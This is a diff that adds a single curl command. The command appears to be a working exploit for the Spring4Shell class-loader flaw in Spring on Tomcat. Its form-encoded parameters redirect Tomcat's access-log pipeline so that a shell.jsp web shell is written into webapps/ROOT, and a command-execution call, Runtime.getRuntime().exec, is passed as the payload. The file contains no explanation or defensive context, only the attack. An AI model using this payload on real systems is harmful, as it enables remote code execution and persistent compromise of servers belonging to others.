@@ -1,0 +1,8 @@
+curl -v -X POST http://<target-url>/<endpoint> \
+-H "Content-Type: application/x-www-form-urlencoded" \
+--data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{c2}i" \
+--data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
+--data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
+--data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" \
+--data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" \
+--data-urlencode "c2=Runtime.getRuntime().exec(\"id\")"
